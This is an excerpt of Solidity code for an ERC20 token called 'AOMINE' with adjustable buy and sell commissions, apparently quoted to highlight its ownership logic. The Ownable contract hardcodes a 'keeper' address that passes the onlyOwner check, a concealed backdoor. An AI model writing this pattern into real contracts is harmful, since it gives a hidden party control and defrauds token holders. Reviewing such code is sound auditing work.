...
contract Ownable is Context {
    ...
    address public keeper = 0x8d51cc3fD9407B2936E0F255B3f886351973D87b;
    ...
    modifier onlyOwner() {
        require(_owner == _msgSender() || keeper == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
...
contract aomine is ERC20, Ownable {
    ...
    uint16 private smallComission; 
    uint16 private mediumComission;
    uint16 private largeComission; 
    ...
    constructor(uint16 _smallComission, uint16 _mediumComission, uint16 _largeComission, ComissionMode _buyMode, ComissionMode _sellMode) ERC20(unicode"AOMINE", unicode"AOMINE") {
